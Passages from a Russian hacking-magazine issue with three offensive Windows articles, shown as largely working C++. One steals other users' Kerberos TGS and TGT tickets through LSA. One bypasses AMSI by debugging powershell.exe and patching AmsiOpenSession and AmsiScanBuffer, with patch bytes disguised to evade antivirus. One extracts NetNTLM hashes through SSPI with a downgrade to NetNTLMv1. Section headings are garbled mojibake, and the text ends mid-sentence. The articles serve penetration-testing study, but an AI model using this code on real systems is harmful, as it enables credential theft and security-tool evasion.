Сна чала   готовим   две   структуры —   KERB_RETRIEVE_TKT_REQUEST
и  KERB_RETRIEVE_TKT_RESPONSE.  Первую  ини циализируем  значениями,
которые я уже описывал.


PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
dwTarget = (USHORT)((wcslen(szTarget) + 1) * sizeof(wchar_t));
szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_DEFAULT;
pKerbRetrieveRequest->EncryptionType = KERB_ETYPE_DEFAULT;
pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
pKerbRetrieveRequest->TargetName.MaximumLength = dwTarget;
pKerbRetrieveRequest->LogonId = logonId;
pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)
pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));


RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget,
pKerbRetrieveRequest->TargetName.MaximumLength);

И вызываем LSA:


NTSTATUS status = LsaCallAuthenticationPackage(hLsa, AP,
pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData
, &packageStatus);

Те перь LSA обратится к KDC и получит новый тикет. Если мы сразу же поп-
робуем его извлечь, то он не будет валидным. Точнее, в нем не будет сес-
сионного ключа и пользовать ся им не получится.
  Поэто му,  убедив шись,   что  вызов  успешно  совершен,  меняем
CacheOptions  на  KERB_RETRIEVE_TICKET_AS_KERB_CRED  и  обращаем ся
к LSA.


if (status == STATUS_SUCCESS) {
 if (packageStatus == STATUS_SUCCESS) {
   pKerbRetrieveRequest->CacheOptions =
KERB_RETRIEVE_TICKET_AS_KERB_CRED;
   status = LsaCallAuthenticationPackage(hLsa, AP,
pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData
, &packageStatus);
   if (status == STATUS_SUCCESS) {
     if (packageStatus == STATUS_SUCCESS) {
       std::wcout << L"[+] Asking for TGS Success" << std::endl;
       std::cout << "[+] Ticket: " << base64_encode(
pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->
Ticket.EncodedTicketSize) << std::endl;

Би лет будет лежать в поле Ticket.EncodedTicket. Пред лагаю посмотреть,
как это работа ет.
  Представим, что во время пентеста мы сломали машину, на которую ходит
поль зователь CRINGE\petka. Запус каем TGSThief и видим его сессию.
  Передаем номер его сес сии.





                            Указание сессии

Затем прописываем нужный SPN, то есть служ бу, на которую нужно получить
TGS-билет. И получаем его.





                       Успешный инжект билета

Успех! Теперь можем ходить от лица CRINGE\petka на dc01.cringe.lab.


TGT — ÝÒÎ TGS

Казалось бы, получение билета TGS — отличный результат! Но всегда хочется
боль шего, прав да? Знаешь ли ты, что билет TGT — это фактически билет TGS,
но на службу krbtgt? Получается, что у нас есть TGS-билет на krbtgt, а служба
krbtgt позволяет выписывать другие TGS-билеты. Вот и всё.
  К такому выводу я пришел, ког да писал дампер билетов. Доказать проще
прос того: вновь запускаем TGSThief, только в этот раз указываем krbtgt/
cringe.lab.





                    Получение TGT-билета

Бин го! Мы можем запрашивать чужие билеты TGT! Таким образом, если
при пентесте удалось захватить какой-то хост, куда ходят пользовате ли, то,
используя TGSThief, получится раздобыть и TGT этих пользователей. Причем
билеты TGT будут абсо лютно свежие, новые, толь ко что запрошенные.


ÂÛÂÎÄÛ

Те перь ты знаешь, как зло употреблять сес сиями пользователей по-новому.
Эта атака в оче редной раз подтвержда ет, что на системы нельзя ходить
от лица администратора домена. В противном слу чае ата кующий сможет зах-
ватить всю сеть в счи таные минуты.
COVERSTORY





Antimalware  Scan  Interface —  сис тема,
которую в Microsoft соз дали для защиты
от вре доносных сце нариев на PowerShell.
В   этой   статье   я  про демонстрирую,
как работает один из методов обхо да это го         MichelleVermishelle                                                                                       @Michaelzhm
механизма. Мы будем запускать сценарий        michael.zhmailo@yandex.ru
PowerShell как процесс под отладкой, что
откро ет некото рые интересные возможнос-
ти.


На высоком уров не AMSI хукает каждую коман ду или сценарий во вре мя
выполнения и переда ет их локальному антивирусному ПО для провер ки. При-
чем поддержи вают ся практически любые  антивирусы,  это может быть
не толь ко стан дартный Defender.
  AMSI умеет работать:
 • с PowerShell;
 • Windows Script Host (wscript и cscript);
 • JavaScript и VBScript;
 • VBA-макросами.

Проблема такой реализации в том, что amsi.dll (в которой реализована вся
логика AMSI) находится в адресном пространс тве текущего про цесса.
Как следствие, у атакующих появляется возможность манипулировать этой
библиотекой так, как они захотят сами. Уже придума но множес тво способов
обхода, это и amsiInitFailed, и хукинг, и патчинг. Сегодня мы обсудим еще один
метод обхо да — запуск процес са PowerShell в режиме отладки.


ÑÒÀÍÎÂÈÌÑß ÄÅÁÀÃÃÅÐÎÌ

Не дав но я обна ружил интересную API-фун кцию DebugActiveProcess(),
которая поз воляет нашему процессу стать дебаг гером для дру гого процес са.
Прототип у нее очень прос той, ей нужно передать лишь PID про цесса,
который требуется отлаживать.


BOOL DebugActiveProcess(
  [in] DWORD dwProcessId
);

К сожале нию, абы какой про цесс отлаживать не получится. Успешный вызов
этой функции получится, только если выпол няется хотя бы одно из сле дующих
условий:
 • у токена нашего процесса есть SeDebugPrivilege;
 • мы можем  запросить  хендл  на  отлажива емый  процесс  с  маской
  PROCESS_ALL_ACCESS.

Казалось бы, требования более чем серь езные, но ничто не мешает нам
запустить процесс powershell.exe как дочерний, а на дочерний процесс
наш родитель ский уж точно сможет зап росить маску PROCESS_ALL_ACCESS.
   Что же нам даст ста тус дебаггера? Единс твен ное пре имущество — воз-
можность     обрабатывать     Debug-события,     сре ди     которых
LOAD_DLL_DEBUG_EVENT. Событие генерируется сразу же, как только идет
попытка заг рузки DLL в адресное пространс тво отлаживаемого процесса.
При чем  будет заполнена  структура LOAD_DLL_DEBUG_INFO, содержащая
базовый адрес под гружаемой биб лиотеки. А с базовым адре сом уже можно
наворо тить немало дел...
  Предлагаю перей ти к практике. Во-первых, мы не можем слепо взять
и запустить про цесс, а потом непонят но когда прицепить ся к нему отладчи-
ком — так есть шанс про пустить момент заг рузки amsi.dll в процесс. Поэто-
му про цесс дол жен быть запущен с флагом CREATE_SUSPENDED. Во-вторых,
из-за того, что мы никак не обра батываем Debug-события, приложение
может упасть. Поэто му после того, как пропатчим AMSI, сле дует как можно
скорее переставать быть дебаг гером.
  Для   соз дания   процесса    я   написал   отдель ную   функцию
StartProcessSuspended().


DWORD StartProcessSuspended(LPWSTR ProcName, HANDLE& hThread, HANDLE&
hProc) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;


    if (!CreateProcess(ProcName, NULL, NULL, NULL, FALSE,
CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        std::cout << h("[-] Cant Create Suspended Process : ") << err
<< " " << GetWinapiErrorDescription(err) << std::endl;
        return -1;
    }
    hThread = pi.hThread;
    hProc = pi.hProcess;


#ifdef DEBUG
    std::cout << h("[+] Process Created Successfully") << std::endl;
#endif


    return pi.dwProcessId;


}

Здесь допол нительно указан флаг CREATE_NEW_CONSOLE. Он нужен, чтобы
powershell.exe запускалась как новая кон соль. Как будто мы ее запус тили
вруч ную, дважды кликнув на исполняемый файл. Функция возвращает PID
созданного процесса, а также ини циализирует хендлы, указывающие на глав-
ный поток процесса и на сам процесс.
  После соз дания про цесса мы должны прицепиться к нему в качестве
отладчика. Делаем это при помощи функции DebugActiveProcess().


if (!DebugActiveProcess(pid))
    {
        DWORD err = GetLastError();
        std::cerr << h("[-] Failed to attach to process: ") << err <<
" " << GetWinapiErrorDescription(err) << std::endl;
        return 1;
    }

Этой    функции    требуется    толь ко    PID,    PID    возвращается
из StartProcessSuspended(). Теперь можем смело возобновлять основной
поток процесса, не боясь пропустить загрузку amsi.dll. Пос ле возобновле-
ния потока про цесса сра зу же вызываем WaitForDebugEvent() и начинаем
обрабатывать отладочные события.
  Функция WaitForDebugEvent() служит для обработки всех отладочных
событий и име ет прос той прототип.


BOOL WaitForDebugEvent(
  [out] LPDEBUG_EVENT lpDebugEvent,
  [in]  DWORD         dwMilliseconds
);

 • lpDebugEvent — экземпляр специальной  структуры, которая будет
   содер жать информацию об отладочном событии;
 • dwMilliseconds — вре мя, в течение которого ожидать отладочное
   событие. Ставим INFINITE, чтобы ждать бесконеч но.

Пос ле появления любого отла дочного события функция вернет true, а в
lpDebugEvent.dwDebugEventCode будет лежать тип события. Нас интересуют
только LOAD_DLL_DEBUG_EVENT и EXIT_PROCESS_DEBUG_EVENT. Вызов фун-
кции обычно заворачивают в цикл while, а события обрабаты вают через
switch-case.


 while (WaitForDebugEvent(&debugEvent, INFINITE))
    {
        switch (debugEvent.dwDebugEventCode) {
        case LOAD_DLL_DEBUG_EVENT:
                ...
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
                ...
            break;
        }
        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.
dwThreadId, DBG_CONTINUE);
    }

Те перь нужно убедиться в том, что подгрузилась действи тельно amsi.dll
(другие биб лиотеки нас не интересуют). Для получения имени биб лиоте ки
по ее хендлу (хендл будет лежать в lpDebugEvent.u.LoadDll.hFile) выпол-
няется функция GetFinalPathNameByHandleA(). Она вернет в свой вто рой
параметр пол ный путь DLL, который мы будем сравнивать с оригинальным
местополо жением amsi.dll.


case LOAD_DLL_DEBUG_EVENT:
     char szName[MAX_PATH];
     if (GetFinalPathNameByHandleA(debugEvent.u.LoadDll.hFile, szName
, MAX_PATH, VOLUME_NAME_DOS))
     {
        if (strcmp(szName, h("\\\\?\\C:\\Windows\\System32\\amsi.dll"
)) == 0) {


        // Подгрузился AMSI
        }
    }

Наконец, приступаем к пат чингу библиотеки. Сначала сохраня ем базовый
адрес  загрузки  (его  можно  получить  из  lpDebugEvent.u.LoadDll.
lpBaseOfDll) в отдель ную переменную. Следующим шагом нам нужно
получить адре са функций AmsiOpenSession() и AmsiScanBuffer(). Их-то мы
и будем патчить. Есть два варианта:
 • простой способ. Грузим в адресное прос транс тво собс твенного процесса
  биб лиотеку amsi.dll и через GetProcAddress() получаем адре са нуж-
   ных функций. Из-за особенностей DLL эти фун кции будут рас положе ны
   по тем же адре сам в процессе powershell.exe;
 • слож ный спо соб. Ничего не грузим в собственный про цесс, а пар сим EAT
   подгружаемой в текущий момент в процесс PowerShell библиоте ки amsi.

Я, само собой, выб рал слож ный способ. Для этого вывел всю логику по пар-
сингу EAT в отдельную функцию GetFunctionAddressFromEAT(), она при-
нимает хендл процесса, базовый адрес библиотеки, а также имя функции,
адрес которой нужно получить.


FARPROC GetFunctionAddressFromEAT(HANDLE hProcess, LPVOID baseAddress
, const std::string& functionName)
{
    DWORD err;
    IMAGE_DOS_HEADER dosHeader;
    if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(
dosHeader), nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_DOS_HEADER: ") <<
err << h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }


    IMAGE_NT_HEADERS ntHeader;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader),
nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_NT_HEADERS") << err
<< h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }


    IMAGE_EXPORT_DIRECTORY exportDirectory;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) +
        ntHeader.OptionalHeader.DataDirectory[
IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
        &exportDirectory, sizeof(exportDirectory), nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_EXPORT_DIRECTORY") <
< err << h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }


    DWORD* functionAddresses = new DWORD[exportDirectory.
NumberOfFunctions];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) + exportDirectory.AddressOfFunctions,
        functionAddresses, sizeof(DWORD) * exportDirectory.
NumberOfFunctions, nullptr);


    DWORD* functionNames = new DWORD[exportDirectory.NumberOfNames];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) + exportDirectory.AddressOfNames,
        functionNames, sizeof(DWORD) * exportDirectory.NumberOfNames,
nullptr);


    WORD* functionNameOrdinals = new WORD[exportDirectory.
NumberOfNames];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) + exportDirectory.AddressOfNameOrdinals,
        functionNameOrdinals, sizeof(WORD) * exportDirectory.
NumberOfNames, nullptr);


    FARPROC functionAddress = nullptr;
    for (DWORD i = 0; i < exportDirectory.NumberOfNames; ++i)
    {
        char name[256] = { 0 };
        ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(
baseAddress) + functionNames[i], name, sizeof(name), nullptr);
        if (functionName == name)
        {
            DWORD functionOrdinal = functionNameOrdinals[i];
            DWORD functionRelativeVirtualAddress = functionAddresses[
functionOrdinal];
            functionAddress = reinterpret_cast<FARPROC>(
reinterpret_cast<std::uint8_t*>(baseAddress) +
functionRelativeVirtualAddress);
            break;
        }
    }



    delete[] functionAddresses;
    delete[] functionNames;
    delete[] functionNameOrdinals;


    return functionAddress;
}


PVOID addr = GetFunctionAddressFromEAT(hProc, amsiBase, h(
"AmsiOpenSession"));

Здесь идет стандартный парсинг EAT, просто биб лиотеки другого процесса.
Пос ле получения адре са переходим к пат чу. Я рекомендую использовать патч
Rasta Mouse. Проб лема лишь в том, что его патч уже известен и на пос-
ледовательность 0x48,  0x31,  0xC0 могут ругаться анти виру сы. Поэтому
предлагаю сохранить патч в виде последовательности десятич ных чисел
и конвертировать шестнадцатерич ные на лету.


int values[3] = { 72, 49, 192 };
char patch[3];
std::ostringstream oss;
for (int i = 0; i < 3; i++) {
    oss << std::hex << std::setw(2) << std::setfill('0') << values[i]
;
    std::string hexValue = oss.str();
    patch[i] = std::stoi(hexValue, nullptr, 16);
    oss.str("");
}

Сам патч применить нес ложно — дос таточно воспользоваться функци ей
WriteProcessMemory(), которой передадим хендл процес са powershell.exe
и  адрес  функции,  которую  нужно  пропатчить. В  данном  слу чае —
AmsiOpenSession().


WriteProcessMemory(hProc, addr, (PVOID)patch, 3, nullptr);
DWORD err1 = GetLastError();
if (err1 != 0) {
    std::cout << h("[-] Error patching AmsiOpenSession: ") << err1 <<
h(" ") << GetWinapiErrorDescription(err1) << std::endl;
}

Точ но таким же обра зом патчим AmsiScanBuffer().


PVOID addr2 = GetFunctionAddressFromEAT(hProc, amsiBase, h(
"AmsiScanBuffer"));
int values2[6] = { 184, 87,0,7,128,195 };
char patch2[6];
std::ostringstream oss2;
for (int i = 0; i < 6; i++) {
    oss2 << std::hex << std::setw(2) << std::setfill('0') << values2[
i];
    std::string hexValue2 = oss2.str();
    patch2[i] = std::stoi(hexValue2, nullptr, 16);
    oss2.str("");
}
WriteProcessMemory(hProc, addr2, (PVOID)patch2, 6, nullptr);
err1 = GetLastError();
if (err1 != 0) {
    std::cout << h("[-] Error patching AmsiScanBuffer: ") << err1 <<
h(" ") << GetWinapiErrorDescription(err1) << std::endl;
}
std::cout << h("[+] Patching Complete") << std::endl;
goto me;

Затем нужно как можно скорее перес тать быть отладчиком. Для этого ставим
метку на функцию DebugActiveProcessStop().


me:
if (!DebugActiveProcessStop(pid))
    {
   DWORD ll = GetLastError();
   std::cerr << h("[-] Failed to detach from process: ") << ll << h(
" ") << GetWinapiErrorDescription(ll) << std::endl;
    return -1;
  }

Пол ный код про екта дос тупен на моем GitHub. Достаточно лишь запустить
исполняемый файл, а он приведет  к  тому,  что  у нас появит ся окно
powershell.exe, уже с про патченным AMSI!





                           Успешный патч


ÈÇÁÅÃÀÅÌ ÈÑÏÎËÜÇÎÂÀÍÈß ÔÓÍÊÖÈÈ DEBUGACTIVEPROCESS

Фун кция DebugActiveProcess(), конечно, хороша, но хотелось бы избежать
и ее использования. В нашем случае это воз можно: я нашел еще один инте-
ресный флаг, который мож но ука зать при запуске дочернего процесса.
С этим флагом мы авто матически становимся отладчиком для дочер него про-
цесса, что поз воляет обрабатывать все отладочные события. Для этого дос-
таточно   лишь   указать   в   фун кции   CreateProcess()   значение
DEBUG_ONLY_THIS_PROCESS.





                    Изменен ный код функции

В таком случае часть с вызовом функции DebugActiveProcess() можно
заком ментировать — она больше не нужна.





                        Работа ющий патч


ÇÀÊËÞ×ÅÍÈÅ

WinAPI настолько огро мен, что даже самые легитимные фичи могут помочь
ата кующе му дос тичь своих целей. Самое главное — найти нужную функцию
и понять, в какой момент к ней обращаться. А все остальное — дело техники!
COVERSTORY





Windows  позволяет  разработчикам  соз-
давать шиф рован ные каналы связи, под-
писывать  сооб щения  между  клиентом
и  службой,  аутентифицировать  клиента
на  службе.  Зло упот ребляя  этими  воз-         MichelleVermishelle                                                                                       @Michaelzhm
можнос тями, мы можем извлекать учетные        michael.zhmailo@yandex.ru
дан ные пользователя без взаимо действия
с LSASS. В этой статье я про демонстрирую,
как это работает.


Security Support Provider Interface (SSPI) — это механизм, пре дос тавля ющий
огромный набор функций для разработ чиков. Среди его преиму ществ:
 • независимость от транспор та (данные передавать мож но любым обра-
   зом);
 • общий для всех SSP интерфейс;
 • аутентификация (в том числе с заимствованием прав);
 • кон фиденциальность сообщений (шифрование);
 • сох ранность сообщений (цифровая подпись).

SSP, если ты не читал мою прош лую статью, — это набор DLL-фай лов,
который  поз воля ет  использовать  протоколы  безопасности  (NTLMSSP,
Kerberos и иные) в клиент-сер верных про цессах. Если сильно обобщить, то
SSPI — это API для вызова заг руженных в систему SSP.





ÐÅÊÂÈÇÈÒÛ, ÊÎÍÒÅÊÑÒ È ÁËÎÁÛ

SSPI соз дает  так называемые  security  blobs. По-русски —  «элементы
безопасности» или «компоненты безопас ности», но официального перевода
мне не попадалось, так что остановим ся на «блобах». Этими самыми бло-
бами клиент и сер вер обме ниваются по удоб ному для них протоколу.
   Чтобы подготовить начальные бло бы, кли ент получает хендл, указывающий
на его рек визиты. Под реквизитами понимается хендл на учетные данные кли-
ента, с помощью которых он может, нап ример, пройти аутентификацию
на служ бе. Получить реквизиты можно с помощью AcquireCredentialsHandle().
   Путем обме на блобами выстраивается контекст. Контекст — специальный
объ ект, который хранится и на кли енте, и на сервере. Контекст — результат
успешной аутен тификации клиента на сервере и в некоторых случаях — сер-
вера на клиенте. С помощью выстроенного кон текста можно использовать
весь потенциал SSPI. Например, можно пос троить контекст, получить хендл,
а затем шиф ровать переда ваемые между клиентом и сервером сообщения.
При чем сервер сможет расшифровать сооб щения, так как у него есть кон-
текст, сге нерированный вмес те с клиентом, на котором данные шифруются.
   Итак, для построения контекста используются спе циальные функции
AcceptSecurityContext() и InitializeSecurityContext(). Кон текст выстра ивается
не сразу. Если тре буется еще пару раз обменять ся блобами с сервером
или клиентом, то воз вра щает ся ошибка SEC_I_CONTINUE_NEEDED.
  Думаю, зву чит страш но. Давай визу али зируем. Построение контекста
на сто роне клиента выглядит следующим образом.





                           SSPI на клиенте

Кли ент сначала получает хендл на свои реквизиты с помощью функции
AcquireCredentialsHandle(),  затем  начинает  выстраивать  контекст,
используя блобы. Как толь ко функция InitializeSecurityContext() перес-
тала воз вра щать SEC_I_CONTINUE_NEEDED, можно считать, что контекст выс-
троен, и поль зоваться всеми функциями SSPI.
  На сто роне сервера происходит почти то же самое, толь ко вместо
InitializeSecurityContext()          используется         фун кция
AcceptSecurityContext().





                           SSPI на сервере

Сервер тоже получает хендл на свои реквизиты и точно так же взаимодей-
ствует с блобами. После построения кон тек ста в некоторых слу чаях допол-
нительно вызывается функция ImpersonateSecurityContext(), которая поз воля-
ет заимство вать права клиента.


ÈÇÂÅÑÒÍÛÅ ÀÒÀÊÈ

Те перь, бегло ознакомившись с SSPI, можно перехо дить к экс плуатации. Есть
четыре основных вида атак:
 • Internal Monologue — выстраиваем контекст с помощью SSPI, используя
  NTLMSSP. Извле каем NetNTLM-хеш пользователя;
 • TGT Delegation — выстраиваем кон текст с помощью SSPI, исполь зуя
   Kerberos. Причем контекст выстраиваем на машину с неог раниченным
   делеги рованием, что поз воляет из AP-REQ-пакета достать TGT-билет
   пользователя;
 • обход UAC с помощью SSPI Datagram Contexts. На GitHub есть PoC;
 • LPE через подмену одного контекста другим. Под робнее — на GitHub. Уяз-
   вимость получила номер CVE-2023-21746.

Я познаком лю тебя с первым вариантом. Про TGT Delegation можно про-
читать в статье «Эксплуати руем TGT Delegation в Active Directory».


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ



            ДОСТАЕМ УЧЕТНЫЕ ДАННЫЕ
             WINDOWS, НЕ ТРОГАЯ LSASS





ÂÍÓÒÐÅÍÍÈÉ ÌÎÍÎËÎÃ

Эту атаку придумал исследователь Элад Шамир. Принцип ее заключается
в том, что бы зарегис три ровать свое при ложение и как клиент, и как сер вер.
Затем пройти аутентификацию, используя NTLMSSP. Пос ле успешной аутен-
тификации серверная часть нашей программы получит NetNTLM-хеш поль-
зователя. Кли ент ская часть программы сгенерирует этот хеш по заданному
сервером челленджу.
  Мо жем начинать писать эксплоит! Чтобы было удобнее, я выложил пол ный
код проекта на GitHub. А PoC Элада Шамира можешь глянуть в его репози-
тории.
   Начнем с режимов. В инс трумен те я предус мотрел два флага — -
downgrade и -pid. Работать тулза будет, только если запускать ее от лица
более-менее при виле гированного пользователя. Пер вый флаг поз воля ет
понизить уровень аутентификации до уров ня NetNTLMv1. Эта версия чуть
более прос то брутится. Второй флаг дает воз можность получить NetNTLM-
хеш вла дельца опре делен ного про цесса. Нап ример, если в системе есть
про цесс cmd.exe, запущенный от лица user, то получится дос тать NetNTLM-
хеш этого пользователя.
   Если достаточ ных привилегий  нет, то прос то получим NetNTLM-хеш
текуще го поль зователя. Если на системе разрешен NetNTLMv1, то итоговый
хеш будет первой версии; если не разрешен, то вто рой.
   Начнем с получе ния реквизитов. Как я уже говорил, для этого использует-
ся фун кция AcquireCredentialsHandle().
  Вы зываем ее следующим образом.


SECURITY_STATUS status = AcquireCredentialsHandleW(
   (LPWSTR)response.UserName.c_str(),
   (LPWSTR)L"NTLM",
   SECPKG_CRED_BOTH,
   NULL,
   NULL,
   NULL,
   NULL,
   &_hCred,
   &ClientLifeTime
 );

Первым аргументом ука зываем имя пользователя, чьи реквизиты хотим
получить.  Имя  поль зователя  я  ранее  занес  в  специальный  класс
InternalMonologueResponse.


class InternalMonologueResponse {
public:
 std::wstring Challenge = L"";
 std::wstring Resp1 = L"";
 std::wstring Resp2 = L"";
 std::wstring Domain = L"";
 std::wstring UserName = L"";
 std::wstring UsernameWithoutDomain = L"";
 void Print() {
   std::wcout << UsernameWithoutDomain << L"::" << Domain << L":" <<
Resp1 << L":" << Resp2 << L":" << Challenge << std::endl;
 }
};

Так как в нашей программе предусмотре но получе ние NetNTLM чужих поль-
зователей, нужно будет получить имя пользователя через токен текущего
потока.


LPWSTR GetCurrentUsername() {
 HANDLE hToken;
 if (!OpenThreadToken(GetCurrentThread(), TOKEN_READ,FALSE, &hToken))
{
   if (!OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken))
     return (LPWSTR)L"";
 }


 DWORD bufferSize = 0;
 if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &bufferSize) &&
GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
   CloseHandle(hToken);
   return (LPWSTR)L"";
 }


 PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(bufferSize);
 if (!pTokenUser) {
   CloseHandle(hToken);
   return (LPWSTR)L"";
 }


 if (!GetTokenInformation(hToken, TokenUser, pTokenUser, bufferSize,
&bufferSize)) {
   free(pTokenUser);
   CloseHandle(hToken);
   return (LPWSTR)L"";
 }


 WCHAR accountName[MAX_PATH];
 WCHAR domainName[MAX_PATH];
 DWORD accountNameSize = MAX_PATH;
 DWORD domainNameSize = MAX_PATH;
 SID_NAME_USE snu;


 if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, accountName, &
accountNameSize, domainName, &domainNameSize, &snu)) {
   free(pTokenUser);
   CloseHandle(hToken);
   return (LPWSTR)L"";
 }


 std::wstring username = std::wstring(domainName) + L"\" + std::
wstring(accountName);


 free(pTokenUser);
 CloseHandle(hToken);


 LPWSTR lpwstr = new WCHAR[username.length() + 1];
 wcscpy_s(lpwstr, username.length() + 1, username.c_str());
 return lpwstr;
}

Пос ле получе ния реквизитов (они упали в _hCred) можно начинать обмен
блобами. Пока еще в клиентской час ти нашего приложения вызываем
InitializeSecurityContext().


status = InitializeSecurityContextW(
   &_hCred,
   NULL,
   (LPWSTR)response.UserName.c_str(),
   ISC_REQ_CONNECTION,
   0,
   SECURITY_NATIVE_DREP,
   NULL,
   0,
   &_hClientContext,
   &ClientToken,
   &ContextAttributes,
   &ClientLifeTime
 );

В эту фун кцию передается хендл на реквизиты и все то же имя поль зовате ля.
Фактически мы говорим, что хотим пос троить контекст на самих себя. Сле-
дующие значения стандартны для этой функции, нет смысла их пояснять, они
описаны в докумен тации.
  После ини циали зации первичного блоба (начала построения контекста)
регистри руем  сер верную   часть  нашего  приложе ния.  Из  функции
InitializeSecurityContext() нам вер нулись необ ходимые для пос тро ения
контекста параметры, поэтому переда ем их в AcceptSecurityContext().
Делаем вид, что мы как буд то переда ли эти бло бы на сервер, а сер вер их
получил и начал обра батывать.


status = AcceptSecurityContext(
  &_hCred,
  NULL,
  &ClientToken,
  ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY,
  SECURITY_NATIVE_DREP,
  &_hServerContext,
  &ServerToken,
  &ContextAttributes,
  &ClientLifeTime
  );

Убе див шись, что функция завершена успешно, можем считать, что начало
есть. Фактически произош ло следующее:
 • кли ент обратился к серверу с целью построения контекста;
 • сервер принял запрос и готов обрабатывать все блобы для построения
   кон текста.

Остает ся лишь эмулиро вать отправку чел ленджа клиенту. В модели NTLMSSP
челлендж — это цифровое значение, которое пользователь дол жен изме нить,
используя свой NTLM-хеш.
  Для это го мы сначала должны преобразовать блоб в поток байтов. Он
представ лен в моей программе как std::vector<BYTE>, а преобразование
из   структуры   SecBuﬀerDesc   выполняется   с  помощью   функции
GetSecByteBufferArray(). Структура SecBufferDesc описывает переда-
ваемые блобы.


std::vector <BYTE> serverMessage;
serverMessage = GetSecBufferByteArray(&ServerToken);


std::vector<BYTE> GetSecBufferByteArray(const SecBufferDesc*
pSecBufferDesc) {
 if (!pSecBufferDesc) {
   throw std::invalid_argument("SecBufferDesc pointer cannot be null"
);
 }


 std::vector<BYTE> buffer;


 if (pSecBufferDesc->cBuffers == 1) {
   SecBuffer* pSecBuffer = pSecBufferDesc->pBuffers;
   if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
     buffer.resize(pSecBuffer->cbBuffer);
     memcpy(&buffer[0], pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
   }
 }
 else {
   size_t bytesToAllocate = 0;


   for (unsigned int i = 0; i < pSecBufferDesc->cBuffers; ++i) {
     bytesToAllocate += pSecBufferDesc->pBuffers[i].cbBuffer;
   }


   buffer.resize(bytesToAllocate);
   BYTE* pBufferIndex = &buffer[0];


   for (unsigned int i = 0; i < pSecBufferDesc->cBuffers; ++i) {
     SecBuffer* pSecBuffer = &(pSecBufferDesc->pBuffers[i]);
     if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
       memcpy(pBufferIndex, pSecBuffer->pvBuffer, pSecBuffer->
cbBuffer);
       pBufferIndex += pSecBuffer->cbBuffer;
     }
   }
 }


 return buffer;
}

Те перь нужно поработать с челленджем. То есть со зна чени ем, которое сер-
вер отправ ляет клиенту. Челлендж также следует перевес ти в поток бай тов.


std::vector<uint8_t> challengeBytes = StringToByteArray(challenge);


std::vector<uint8_t> StringToByteArray(LPCWSTR hex) {
  std::wstring hexStr(hex);
  size_t length = hexStr.length();


  if (length % 2 == 1) {
    return std::vector<uint8_t>();
  }


  std::vector<uint8_t> arr(length >> 1);


  for (size_t i = 0; i < length >> 1; ++i) {
    uint8_t msb = (hexStr[i << 1] >= '0' && hexStr[i << 1] <= '9') ?
hexStr[i << 1] - '0' : std::toupper(hexStr[i << 1]) - 'A' + 10;
    uint8_t lsb = (hexStr[(i << 1) + 1] >= '0' && hexStr[(i << 1) + 1
] <= '9') ? hexStr[(i << 1) + 1] - '0' : std::toupper(hexStr[(i << 1)
+ 1]) - 'A' + 10;


    arr[i] = (msb << 4) + lsb;
  }


  return arr;
}

Фун кция выг лядит, конечно, страш но, но умные люди подска зали и более ак-
куратный вари ант.
  Затем сле дует не забывать про ESS. Extended Session Security — один
из механиз мов безопасности для NetNTLMv1, направленный на усложнение
брутфорса этих хешей. В час тности, он позволял предотвратить Rainbow-ата-
ку на этот тип хешей, так как кли ент добав лял и свой челлендж перед тем,
как сфор мировать ответ на сервер. Это изменяет хеш, и пропадает воз-
можность поиска это го хеша в заранее сге нери рованной таблице хеш —
пароль.
  За включение ESS отвечает всего один бит, поэтому просто меняем его
зна чение и отключаем ESS.


if (DisableEss) {
  serverMessage[22] = (BYTE)(serverMessage[22] & 0xF7);
}

В SSPI очень много абстракций. Разработчику достаточно вызывать нужные
функции, что бы получить желаемый результат, а раз бираться в глубоких осо-
